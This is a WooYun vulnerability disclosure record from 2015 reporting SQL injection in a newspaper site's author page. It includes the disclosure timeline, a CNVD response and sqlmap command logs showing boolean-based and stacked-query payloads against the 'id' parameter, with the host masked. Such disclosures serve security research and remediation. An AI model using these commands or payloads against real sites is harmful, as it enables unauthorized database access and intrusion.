{"id": 67246, "wybug_id": "wooyun-2015-0133945", "wybug_title": "某报社系统存在一处SQL注入", "wybug_corp": "南昌维网数字传媒有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-16 11:44", "wybug_open_date": "2015-11-16 11:14", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-16：\t细节向公众公开  简要描述： 捡的。。。。 详细说明：  http://**.**.**.**/bugs/wooyun-2014-076085http://**.**.**.**/bugs/wooyun-2015-0108176Microsoft JET Database Engine 错误 '80040e14' 语法错误 (操作符丢失) 在查询表达式 'id=3968''' 中。 /Authors/index_mod.asp，行 8    漏洞证明：  http://**.**.**.**/Authors/index_mod.asp?id=30http://**.**.**.**/Authors/index_mod.asp?id=30http://**.**.**.**/Authors/index_mod.asp?id=3968http://**.**.**.**/Authors/index_mod.asp?id=1963http://**.**.**.**:8081/Authors/index_mod.asp?id=1530C:\\Python27\\sqlmap>sqlmap.py -u http://**.**.**.**/Authors/index_mod.asp?id=3968    sqlmap/0.9 - automatic SQL injection and database takeover tool    http://**.**.**.**[*] starting at: 19:00:45[19:00:45] [INFO] using 'C:\\Python27\\sqlmap\\output\\**.**.**.**\\session' as session file[19:00:45] [INFO] testing connection to the target url[19:00:46] [INFO] testing if the url is stable, wait a few seconds[19:00:47] [INFO] url is stable[19:00:47] [INFO] testing if GET parameter 'id' is dynamic[19:00:47] [INFO] confirming that GET parameter 'id' is dynamic[19:00:48] [INFO] GET parameter 'id' is dynamic[19:00:48] [INFO] heuristic test shows that GET parameter 'id' might be injectable (possible DBMS: Microsoft Access)[19:00:48] [INFO] testing sql injection on GET parameter 'id'[19:00:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[19:00:49] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectableparsed error message(s) showed that the back-end DBMS could be Microsoft Access. Do you want to skip test payloads specific for other DBMSes? [Y/n][19:00:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'GET parameter 'id' is vulnerable. Do you want to keep testing the others? [y/N]sqlmap identified the following injection points with a total of 15 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=3968 AND 7670=7670---[19:00:52] [INFO] testing Microsoft Access[19:00:53] [INFO] confirming Microsoft Access[19:00:53] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:00:53] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 13 times[19:00:53] [INFO] Fetched data logged to text files under 'C:\\Python27\\sqlmap\\output\\**.**.**.**'C:\\Python27\\sqlmap>sqlmap.py -u http://**.**.**.**/Authors/index_mod.asp?id=30    sqlmap/0.9 - automatic SQL injection and database takeover tool    http://**.**.**.**[*] starting at: 19:01:24[19:01:24] [INFO] using 'C:\\Python27\\sqlmap\\output\\**.**.**.**\\session' as session file[19:01:24] [INFO] testing connection to the target url[19:01:24] [INFO] testing if the url is stable, wait a few seconds[19:01:25] [INFO] url is stable[19:01:25] [INFO] testing if GET parameter 'id' is dynamic[19:01:25] [INFO] confirming that GET parameter 'id' is dynamic[19:01:25] [INFO] GET parameter 'id' is dynamic[19:01:26] [WARNING] heuristic test shows that GET parameter 'id' might not be injectable[19:01:26] [INFO] testing sql injection on GET parameter 'id'[19:01:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[19:01:26] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[19:01:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[19:01:26] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[19:01:26] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[19:01:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[19:01:27] [INFO] testing 'MySQL > 5.0.11 stacked queries'[19:01:27] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[19:01:48] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request[19:02:10] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request[19:02:11] [INFO] GET parameter 'id' is 'PostgreSQL > 8.1 stacked queries' injectable[19:02:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[19:02:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'GET parameter 'id' is vulnerable. Do you want to keep testing the others? [y/N]sqlmap identified the following injection points with a total of 23 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=30 AND 6886=6886    Type: stacked queries    Title: PostgreSQL > 8.1 stacked queries    Payload: id=30; SELECT PG_SLEEP(5);-----[19:02:31] [INFO] the back-end DBMS is PostgreSQLweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: PostgreSQL[19:02:31] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 21 times[19:02:31] [INFO] Fetched data logged to text files under 'C:\\Python27\\sqlmap\\output\\**.**.**.**'[*] shutting down at: 19:02:31跑表跑字段太慢了  就没跑。。。   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-18 11:13 厂商回复： CNVD确认所述情况，已经转由CNCERT同步下发给江西分中心并抄报给教育网应急组织，由其后续协调网站管理单位处置．  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-14 18:12 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1124 漏洞数:308        | 收购乌云币，转账自付手续费，感谢每天可三...)\t\t \n  呵呵，这处住不出数据吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}